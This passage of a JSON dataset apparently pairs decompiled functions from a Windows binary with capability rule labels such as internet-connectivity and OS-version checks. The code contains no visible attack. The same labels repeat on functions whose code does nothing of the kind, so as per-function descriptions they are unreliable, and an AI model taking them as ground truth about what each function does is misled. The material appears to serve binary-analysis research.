        "decompiled_code": "\nvoid fcn.0003fda0(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint var_18h;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    uint32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uchar *puStack28;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x800b8de0;\n    uStack16 = 0x800b8bf4;\n    var_10h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h;\n    puStack28 = &stack0xffffffa8;\n    var_30h = 0;\n    var_40h = 0;\n    iVar1 = fcn.000238f0(0xfffffffe, 0x73, &var_28h, &var_3ch);\n    if (iVar1 == 0) {\n        var_40h = (**0x8005128c)(var_3ch, var_28h << 6, 0, 0, 0);\n        var_4h = 0;\n        (**0x80051298)(var_40h, 0, 0);\n        var_4h = 0xffffffff;\n        for (var_2ch = 0; var_2ch < var_28h; var_2ch = var_2ch + 1) {\n            if ((*(var_3ch + 0xc + var_2ch * 0x40) == 0) || (*0x800ce844 < *(var_3ch + 0xc + var_2ch * 0x40))) {\n                fcn.00023a80(*(var_3ch + var_2ch * 0x40), *(var_3ch + 8 + var_2ch * 0x40), \n                             *(var_3ch + 4 + var_2ch * 0x40));\n            }\n            else {\n                fcn.00037640(0x800ce848, &var_1ch, 0);\n                var_34h = fcn.0003f990(var_2ch, 1);\n                if (var_34h == 0) {\n                    fcn.00037670(0x800ce848, &var_1ch, 0);\n                }\n                else if ((*(var_3ch + 0x14 + var_2ch * 0x40) == *(var_34h + 0x1c)) &&\n                        (*(var_3ch + 0x18 + var_2ch * 0x40) == *(var_34h + 0x20))) {\n                    var_20h = *(var_3ch + 0x10 + var_2ch * 0x40);\n                    iVar1 = *(var_34h + 0x42c);\n                    fcn.00037670(0x800ce848, &var_1ch, 0);\n                    if (var_20h != iVar1) {\n                        if (*(var_34h + 0xc) == 0) {\n                            fcn.00051be0(var_2ch, var_20h);\n                        }\n                        else {\n                            fcn.0003ca60(var_2ch, var_20h);\n                        }\n                    }\n                    if (*(var_3ch + 0x30 + var_2ch * 0x40) == 0) {\n                        var_24h = 0;\n                        var_38h = 0;\ncode_r0x00040103:\n                        fcn.00037640(0x800ce848, &var_1ch, 0);\n                        var_34h = fcn.0003f990(var_2ch, 1);\n                        if (var_34h != 0) {\n                            fcn.00037640(var_34h + 0x430, &var_44h, 1);\n                            var_30h = *(var_34h + 0x424);\n                            *(var_34h + 0x424) = var_24h;\n                            *(var_34h + 0x428) = var_38h;\n                            fcn.00037670(var_34h + 0x430, &var_44h, 1);\n                        }\n                        fcn.00037670(0x800ce848, &var_1ch, 0);\n                        fcn.000357f0(var_30h);\n                    }\n                    else {\n                        var_24h = fcn.000356f0(*(var_3ch + 0x30 + var_2ch * 0x40));\n                        if ((var_24h != 0) &&\n                           (iVar1 = fcn.00023a30(*(var_3ch + var_2ch * 0x40), *(var_3ch + 8 + var_2ch * 0x40), \n                                                 *(var_3ch + 4 + var_2ch * 0x40), 0, var_24h, \n                                                 *(var_3ch + 0x30 + var_2ch * 0x40), &var_38h),  iVar1 == 0)) {\n                            if (var_38h % 8 == 0) {\n                                var_38h = var_38h >> 3;\n                                iVar1 = fcn.00065aa0(var_24h, var_38h);\n                                if (iVar1 != 0) goto code_r0x00040103;\n                                fcn.00023a80(*(var_3ch + var_2ch * 0x40), *(var_3ch + 8 + var_2ch * 0x40), \n                                             *(var_3ch + 4 + var_2ch * 0x40));\n                                fcn.000357f0(var_24h);\n                            }\n                            else {\n                                fcn.00023a80(*(var_3ch + var_2ch * 0x40), *(var_3ch + 8 + var_2ch * 0x40), \n                                             *(var_3ch + 4 + var_2ch * 0x40));\n                                fcn.000357f0(var_24h);\n                            }\n                        }\n                    }\n                }\n                else {\n                    fcn.00037670(0x800ce848, &var_1ch, 0);\n                    fcn.00023a80(*(var_3ch + var_2ch * 0x40), *(var_3ch + 8 + var_2ch * 0x40), \n                                 *(var_3ch + 4 + var_2ch * 0x40));\n                }\n            }\n        }\n        (**0x80051294)(var_40h);\n        (**0x800512a4)(var_40h);\n        fcn.00023b90(var_3ch);\n    }\n    *in_FS_OFFSET = var_10h;\n    return;\n}\n",
        "token_count": 1634
    },
    "000401f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000401f0(uint noname_0, uint noname_1, uint arg_10h, uint *arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_48h;\n    uint var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_10h = 0xc0000001;\n    *arg_14h = 0;\n    iVar1 = fcn.00020a80(arg_10h, 0x1a, 2, &var_5ch, 4);\n    if (iVar1 == 0) {\n        uVar2 = 0x21590065;\n    }\n    else if (var_5ch == 0) {\n        uVar2 = 0x21590065;\n    }\n    else {\n        iVar1 = fcn.00020a80(arg_10h, 0x1b, 3, &var_ch, 4);\n        if (iVar1 == 0) {\n            uVar2 = 0x21590066;\n        }\n        else {\n            var_44h = 0;\n            var_40h = 0;\n            var_3ch = 0;\n            var_48h = var_ch;\n            var_10h = fcn.0003df90(var_5ch, &var_4h);\n            if (var_10h != 0) {\n                fcn.00078a2c(var_10h);\n            }\n            if (var_4h == 0) {\n                var_10h = fcn.00051be0(var_5ch, var_ch);\n            }\n            else {\n                var_10h = fcn.0003ca60(var_5ch, var_ch);\n            }\n            fcn.00037640(0x800ce848, &var_8h, 0);\n            var_14h = fcn.0003f990(var_5ch, 1);\n            if (var_14h == 0) {\n                fcn.00037670(0x800ce848, &var_8h, 0);\n                uVar2 = 0xc00000ef;\n            }\n            else {\n                if (var_10h == 0) {\n                    *(var_14h + 0x42c) = var_ch;\n                }\n                var_44h = *(var_14h + 0x1c);\n                var_40h = *(var_14h + 0x20);\n                fcn.00037670(0x800ce848, &var_8h, 0);\n                iVar1 = fcn.00023930(0xfffffffe, 0x73, &var_5ch, &var_58h);\n                if (iVar1 == 0) {\n                    fcn.00023b50(var_58h, var_50h, var_54h, 0, var_ch);\n                }\n                else {\n                    fcn.000238b0(0xfffffffe, 0x73, var_5ch, 0, 0, &var_48h);\n                }\n                *(var_14h + 0x42c) = var_ch;\n                uVar2 = fcn.00078a2c(var_10h);\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 815
    },
    "00040390": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00040390(uint noname_0, uint noname_1, uint arg_10h, uint *arg_14h)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t var_70h;\n    uint var_6ch;\n    int32_t var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint32_t var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uint32_t var_2ch;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_10h = 0;\n    var_14h = 0;\n    *arg_14h = 0;\n    iVar2 = fcn.00020a80(arg_10h, 0x1a, 2, &var_68h, 4);\n    if (iVar2 == 0) {\n        var_70h = 0x21590065;\n    }\n    else if (var_68h == 0) {\n        var_70h = 0x21590065;\n    }\n    else {\n        iVar2 = fcn.00020a10(arg_10h, 0x1c, 5, &var_8h, &var_5ch);\n        if (iVar2 == 0) {\n            var_8h = 0;\n            var_5ch = 0;\n        }\n        if (var_8h == 0) {\n            var_10h = 0;\n        }\n        else {\n            if (var_5ch % 8 != 0) {\n                return 0x21590066;\n            }\n            var_5ch = var_5ch >> 3;\n            for (var_ch = 0; var_ch < var_5ch; var_ch = var_ch + 1) {\n                uVar1 = fcn.00035980(var_ch & 0xffff0000 | *(var_8h + var_ch * 8));\n                *(var_8h + var_ch * 8) = uVar1;\n                uVar3 = fcn.00035950(*(var_8h + 4 + var_ch * 8));\n                *(var_8h + 4 + var_ch * 8) = uVar3;\n            }\n            iVar2 = fcn.00065aa0(var_8h, var_5ch);\n            if (iVar2 == 0) {\n                return 0x21590066;\n            }\n            var_10h = fcn.000356f0(var_5ch << 3);\n            if (var_10h == 0) {\n                return 0x21590004;\n            }\n            fcn.00078be8(var_10h, var_8h, var_5ch << 3);\n        }\n        fcn.00037640(0x800ce848, &var_4h, 0);\n        var_14h = fcn.0003f990(var_68h, 1);\n        if (var_14h == 0) {\n            var_70h = 0x21590065;\n            fcn.00037670(0x800ce848, &var_4h, 0);\n        }\n        else {\n            fcn.00037640(var_14h + 0x430, &var_6ch, 1);\n            var_8h = *(var_14h + 0x424);\n            *(var_14h + 0x424) = var_10h;\n            *(var_14h + 0x428) = var_5ch;\n            fcn.00037670(var_14h + 0x430, &var_6ch, 1);\n            var_64h = *(var_14h + 0x1c);\n            var_60h._0_2_ = *(var_14h + 0x20);\n            fcn.00037670(0x800ce848, &var_4h, 0);\n            fcn.000357f0(var_8h);\n            var_70h = 0;\n        }\n        if (var_70h == 0) {\n            iVar2 = fcn.00023930(0xfffffffe, 0x73, &var_68h, &var_58h);\n            if (iVar2 == 0) {\n                if (var_2ch < var_5ch << 3) {\n                    fcn.00023a80(var_58h, var_50h, var_54h);\n                    fcn.000238b0(var_58h, var_50h, var_4ch, var_10h, var_5ch << 3, &var_48h);\n                }\n                else {\n                    fcn.00023b20(var_58h, var_50h, var_54h);\n                    fcn.000239f0(var_58h, var_50h, var_54h, 0, var_10h, var_5ch << 3);\n                }\n            }\n            else {\n                var_3ch = 0;\n                var_48h = *(var_14h + 0x42c);\n                var_44h = var_64h;\n                var_40h = var_60h;\n                fcn.000238b0(0xfffffffe, 0x73, var_68h, var_10h, var_5ch << 3, &var_48h);\n            }\n        }\n    }\n    return var_70h;\n}\n",
        "token_count": 1319
    },
    "00040680": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00040680(void)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    for (var_8h = 0; var_8h < 100; var_8h = var_8h + 1) {\n        iVar1 = fcn.0003df90(var_8h, &var_4h);\n        if (iVar1 == 0) {\n            if (var_4h == 0) {\n                fcn.00051b40(var_8h);\n            }\n            else {\n                fcn.0003cae0(var_8h);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 160
    },
    "000406e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000406e0(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint var_bch;\n    int16_t *var_b8h;\n    uint *var_b4h;\n    uint var_ach;\n    int16_t *var_a8h;\n    int16_t *var_a4h;\n    uint var_9ch;\n    int16_t *var_98h;\n    int16_t *var_94h;\n    uint var_90h;\n    uint var_88h;\n    int16_t *var_84h;\n    uint var_80h;\n    uint var_78h;\n    int16_t *var_74h;\n    uint var_70h;\n    uint *var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint32_t var_1ch;\n    char *var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    *arg_14h = 3;\n    var_8h = 0;\n    var_4h = 0;\n    var_10h = 5;\n    var_ch = &var_68h;\n    var_68h = 0x27;\n    var_64h = 2;\n    var_60h = 0x28;\n    var_5ch = 4;\n    var_58h = 0x29;\n    var_54h = 3;\n    var_50h = 0x31;\n    var_4ch = 2;\n    var_48h = 0x3a;\n    var_44h = 4;\n    fcn.00040680();\n    fcn.00037640(0x800ce848, &var_14h, 0);\n    var_8h = *0x800ce844;\n    var_4h = fcn.000356f0(*0x800ce844 << 2);\n    if (var_4h == 0) {\n        fcn.00037670(0x800ce848, &var_14h, 0);\n        var_70h = 0x21590004;\n    }\n    else {\n        var_1ch = 0;\n        for (var_6ch = *0x800ce840; (var_1ch < *0x800ce844 && (var_6ch != NULL)); var_6ch = *var_6ch) {\n            var_74h = var_6ch + 0x222;\n            do {\n                iVar1 = *var_74h;\n                var_74h = var_74h + 1;\n            } while (iVar1 != 0);\n            uVar3 = fcn.000356f0(var_10h * 0x10 + 0x26 + (var_74h - (var_6ch + 0x89) >> 1) * 2);\n            *(var_4h + var_1ch * 4) = uVar3;\n            if (*(var_4h + var_1ch * 4) == 0) {\n                fcn.00037670(0x800ce848, &var_14h, 0);\n                var_70h = 0x21590004;\n                goto code_r0x00040c96;\n            }\n            fcn.00078bfa(*(var_4h + var_1ch * 4), 0, var_10h << 4);\n            *(*(var_4h + var_1ch * 4) + 4) = *(var_4h + var_1ch * 4) + 8;\n            **(var_4h + var_1ch * 4) = 4;\n            **(*(var_4h + var_1ch * 4) + 4) = var_6ch[2];\n            *(*(var_4h + var_1ch * 4) + 0x14) = var_10h * 0x10 + *(var_4h + var_1ch * 4);\n            var_84h = var_6ch + 0x222;\n            do {\n                iVar1 = *var_84h;\n                var_84h = var_84h + 1;\n            } while (iVar1 != 0);\n            *(*(var_4h + var_1ch * 4) + 0x10) = (var_84h - (var_6ch + 0x89) >> 1) * 2 + 2;\n            var_94h = var_6ch + 0x222;\n            var_98h = *(*(var_4h + var_1ch * 4) + 0x14);\n            do {\n                iVar1 = *var_94h;\n                *var_98h = iVar1;\n                var_94h = var_94h + 1;\n                var_98h = var_98h + 1;\n            } while (iVar1 != 0);\n            *(*(var_4h + var_1ch * 4) + 0x24) = *(var_4h + var_1ch * 4) + 0x28;\n            *(*(var_4h + var_1ch * 4) + 0x20) = 4;\n            **(*(var_4h + var_1ch * 4) + 0x24) = var_6ch[0x10b];\n            *(*(var_4h + var_1ch * 4) + 0x34) = *(var_4h + var_1ch * 4) + 0x38;\n            *(*(var_4h + var_1ch * 4) + 0x30) = 4;\n            **(*(var_4h + var_1ch * 4) + 0x34) = var_6ch[0x10a];\n            *(*(var_4h + var_1ch * 4) + 0x40) = 0x24;\n            *(*(var_4h + var_1ch * 4) + 0x44) =\n                 *(var_4h + var_1ch * 4) + var_10h * 0x10 + *(*(var_4h + var_1ch * 4) + 0x10);\n            puVar2 = *(*(var_4h + var_1ch * 4) + 0x44);\n            *puVar2 = var_6ch[7];\n            *(puVar2 + 1) = *(var_6ch + 8);\n            var_1ch = var_1ch + 1;\n        }\n        fcn.00037670(0x800ce848, &var_14h, 0);\n        for (var_1ch = 0; var_1ch < var_8h; var_1ch = var_1ch + 1) {\n            var_18h = *(*(var_4h + var_1ch * 4) + 0x44);\n            if ((((*var_18h == '\\0') && (var_18h[1] == '\\0')) && (var_18h[2] == '\\0')) &&\n               (((var_18h[3] == '\\0' && (var_18h[4] == '\\0')) && (var_18h[5] == '\\0')))) {\n                var_a4h = 0x80055034;\n                var_a8h = *(*(var_4h + var_1ch * 4) + 0x44);\n                do {\n                    iVar1 = *var_a4h;\n                    *var_a8h = iVar1;\n                    var_a4h = var_a4h + 1;\n                    var_a8h = var_a8h + 1;\n                } while (iVar1 != 0);\n            }\n            else {\n                fcn.00078a20(&var_40h, 0x80055058, *var_18h, var_18h[1], var_18h[2], var_18h[3], var_18h[4], var_18h[5])\n                ;\n                var_b4h = &var_40h;\n                var_b8h = *(*(var_4h + var_1ch * 4) + 0x44);\n                do {\n                    iVar1 = *var_b4h;\n                    *var_b8h = iVar1;\n                    var_b4h = var_b4h + 2;\n                    var_b8h = var_b8h + 1;\n                } while (iVar1 != 0);\n            }\n        }\n        var_70h = fcn.0002f2c0(&var_10h, arg_18h, arg_1ch);\n    }\ncode_r0x00040c96:\n    if (var_4h != 0) {\n        for (var_1ch = 0; var_1ch < var_8h; var_1ch = var_1ch + 1) {\n            fcn.000357f0(*(var_4h + var_1ch * 4));\n        }\n    }\n    fcn.000357f0(var_4h);\n    return var_70h;\n}\n",
        "token_count": 2190
    },
    "00040ce0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00040ce0(uint noname_0, uint noname_1, uint arg_10h, uint *arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0xc0000001;\n    *arg_14h = 0;\n    iVar1 = fcn.00020a80(arg_10h, 0x1a, 2, &var_18h, 4);\n    if (iVar1 == 0) {\n        uVar2 = 0x21590065;\n    }\n    else {\n        iVar1 = fcn.00020a10(arg_10h, 0x1f, 5, &var_1ch, &var_14h);\n        if (iVar1 == 0) {\n            uVar2 = 0x21590066;\n        }\n        else {\n            fcn.00037640(0x800ce848, &var_8h, 0);\n            var_10h = fcn.0003f990(var_18h, 0);\n            if (var_10h == 0) {\n                fcn.00037670(0x800ce848, &var_8h, 0);\n                uVar2 = 0x21590065;\n            }\n            else if (*(var_10h + 0x10) == 0) {\n                var_4h = *(var_10h + 0xc);\n                fcn.00037670(0x800ce848, &var_8h, 0);\n                if (var_4h == 0) {\n                    var_ch = fcn.00051c00(var_18h, var_1ch, var_14h);\n                }\n                else {\n                    var_ch = fcn.0003cb70(var_18h, var_1ch, var_14h);\n                }\n                uVar2 = fcn.00078a2c(var_ch);\n            }\n            else {\n                fcn.00037670(0x800ce848, &var_8h, 0);\n                uVar2 = 0;\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 535
    },
    "00040df0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_218h\n\nvoid fcn.00040df0(void)\n\n{\n    int32_t iVar1;\n    uint *var_218h;\n    uint var_12h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 1;\n    while( true ) {\n        fcn.00037640(0x800ce848, &var_8h, 0);\n        iVar1 = fcn.0003f990(var_4h, 1);\n        if (iVar1 != 0) {\n            fcn.00078a08(&var_218h, iVar1 + 0x22, 0x104);\n        }\n        fcn.00037670(0x800ce848, &var_8h, 0);\n        if (iVar1 == 0) break;\n        var_218h = &var_218h;\n        fcn.00041050(var_218h, 0x800cb85c);\n        var_4h = var_4h + 1;\n    }\n    return;\n}\n",
        "token_count": 254
    },
    "00040eb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00040eb0(void)\n\n{\n    int32_t iVar1;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_ch = fcn.00041a00(0x800cb998, 0, &var_8h);\n    if (var_ch == 0) {\n        for (var_4h = 0; *(var_8h + var_4h * 4) != 0; var_4h = var_4h + 1) {\n            var_ch = fcn.00041840(*(var_8h + var_4h * 4), 0x80055094, &var_10h, &var_18h, &var_14h);\n            if (var_ch == 0) {\n                if (var_10h == 1) {\n                    iVar1 = fcn.00078a32(var_18h, 0x800550ac, 7);\n                    if (iVar1 == 0) {\n                        fcn.000357f0(var_18h);\n                    }\n                    else {\n                        iVar1 = fcn.00078a32(var_18h, 0x800550bc, 8);\n                        if (iVar1 == 0) {\n                            fcn.000357f0(var_18h);\n                        }\n                        else {\n                            fcn.0003e100(var_18h);\n                            fcn.000357f0(var_18h);\n                        }\n                    }\n                }\n                else {\n                    fcn.000357f0(var_18h);\n                }\n            }\n        }\n        var_ch = 0;\n    }\n    fcn.000419a0(var_8h);\n    return var_ch;\n}\n",
        "token_count": 420
    },
    "00040fc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00040fc0(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t var_214h;\n    uint var_210h;\n    uint32_t var_4h;\n    \n    *arg_8h = 0;\n    for (var_4h = 0; var_4h < 100; var_4h = var_4h + 1) {\n        iVar1 = fcn.0003fa00(var_4h, &var_210h, 0x104);\n        if (((iVar1 == 0) && (iVar1 = fcn.00041320(&var_210h, 0x800cb85c, &var_214h),  iVar1 == 0)) && (var_214h == 0))\n        {\n            *arg_8h = 1;\n            fcn.000414b0(&var_210h, 0x800cb85c);\n        }\n    }\n    return;\n}\n",
        "token_count": 221
    },
    "00041050": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_5ch\n\nint32_t __cdecl fcn.00041050(uint arg_8h, int16_t *arg_ch)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint var_5ch;\n    uint var_54h;\n    int16_t *var_50h;\n    uint var_4ch;\n    uint var_44h;\n    int16_t *var_40h;\n    uint var_3ch;\n    uint var_34h;\n    int16_t *var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_8h = fcn.00041a00(0x800cb8d8, 0x800550d0, &var_ch);\n    if (var_8h != 0) {\ncode_r0x0004130a:\n        fcn.000419a0(var_ch);\n        return var_8h;\n    }\n    var_4h = 0;\n    do {\n        if (*(var_ch + var_4h * 4) == 0) goto code_r0x000412f7;\n        var_1ch = 0;\n        var_20h = 0;\n        var_18h = 0;\n        var_8h = fcn.00041840(*(var_ch + var_4h * 4), 0x800550e0, &var_14h, &var_1ch, &var_2ch);\n        if (var_8h == 0) {\n            iVar2 = fcn.00078b82(var_1ch, arg_8h);\n            if (iVar2 == 0) {\n                fcn.000357f0(var_1ch);\n            }\n            else {\n                var_8h = fcn.00041840(*(var_ch + var_4h * 4), 0x800550f0, &var_14h, &var_20h, &var_2ch);\n                if (var_8h == 0) {\n                    var_30h = arg_ch;\n                    do {\n                        iVar1 = *var_30h;\n                        var_30h = var_30h + 1;\n                    } while (iVar1 != 0);\n                    var_10h = fcn.00041da0(var_20h, var_2ch, arg_ch, var_30h - (arg_ch + 1) >> 1);\n                    if (var_10h == 0) {\n                        fcn.000357f0(var_1ch);\n                        fcn.000357f0(var_20h);\n                        var_8h = 0;\n                    }\n                    else {\n                        var_40h = arg_ch;\n                        do {\n                            iVar1 = *var_40h;\n                            var_40h = var_40h + 1;\n                        } while (iVar1 != 0);\n                        var_24h = var_10h + 2 + (var_40h - (arg_ch + 1) >> 1) * 2;\n                        var_50h = arg_ch;\n                        do {\n                            iVar1 = *var_50h;\n                            var_50h = var_50h + 1;\n                        } while (iVar1 != 0);\n                        var_28h = var_2ch - ((var_50h - (arg_ch + 1) >> 1) * 2 + 2);\n                        var_18h = fcn.000356c0(var_28h);\n                        if (var_18h == 0) {\n                            var_8h = -0x3fffff66;\n                            fcn.000357f0(var_1ch);\n                            fcn.000357f0(var_20h);\n                        }\n                        else {\n                            fcn.00078bfa(var_18h, 0, var_28h);\n                            fcn.00078be8(var_18h, var_20h, var_10h - var_20h);\n                            fcn.00078be8((var_10h - var_20h) + var_18h, var_24h, var_2ch - (var_24h - var_20h));\n                            var_8h = fcn.000417a0(*(var_ch + var_4h * 4), 0x800550f0, var_18h, var_28h, 7);\n                            fcn.000357f0(var_1ch);\n                            fcn.000357f0(var_20h);\n                            fcn.000357f0(var_18h);\n                        }\n                    }\ncode_r0x000412f7:\n                    if (*(var_ch + var_4h * 4) == 0) {\n                        var_8h = -0x3fffffff;\n                    }\n                    goto code_r0x0004130a;\n                }\n                fcn.000357f0(var_1ch);\n            }\n        }\n        var_4h = var_4h + 1;\n    } while( true );\n}\n",
        "token_count": 1200
    },
    "00041320": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch\n\nint32_t __cdecl fcn.00041320(uint arg_8h, int16_t *arg_ch, uint *arg_10h)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint var_2ch;\n    uint var_24h;\n    int16_t *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    *arg_10h = 0;\n    var_8h = fcn.00041a00(0x800cb8d8, 0x800550d0, &var_ch);\n    if (var_8h != 0) {\ncode_r0x0004149e:\n        fcn.000419a0(var_ch);\n        return var_8h;\n    }\n    var_4h = 0;\n    do {\n        if (*(var_ch + var_4h * 4) == 0) goto code_r0x0004148b;\n        var_14h = 0;\n        var_18h = 0;\n        var_8h = fcn.00041840(*(var_ch + var_4h * 4), 0x800550e0, &var_10h, &var_14h, &var_1ch);\n        if (var_8h == 0) {\n            iVar2 = fcn.00078b82(var_14h, arg_8h);\n            if (iVar2 == 0) {\n                fcn.000357f0(var_14h);\n            }\n            else {\n                var_8h = fcn.00041840(*(var_ch + var_4h * 4), 0x800550f0, &var_10h, &var_18h, &var_1ch);\n                if (var_8h == 0) {\n                    var_20h = arg_ch;\n                    do {\n                        iVar1 = *var_20h;\n                        var_20h = var_20h + 1;\n                    } while (iVar1 != 0);\n                    iVar2 = fcn.00041da0(var_18h, var_1ch, arg_ch, (var_20h - (arg_ch + 1) >> 1) << 1);\n                    if (iVar2 == 0) {\n                        *arg_10h = 0;\n                    }\n                    else {\n                        *arg_10h = 1;\n                    }\n                    var_8h = 0;\n                    fcn.000357f0(var_14h);\n                    fcn.000357f0(var_18h);\ncode_r0x0004148b:\n                    if (*(var_ch + var_4h * 4) == 0) {\n                        var_8h = -0x3fffffff;\n                    }\n                    goto code_r0x0004149e;\n                }\n                fcn.000357f0(var_14h);\n            }\n        }\n        var_4h = var_4h + 1;\n    } while( true );\n}\n",
        "token_count": 713
    },
    "000414b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
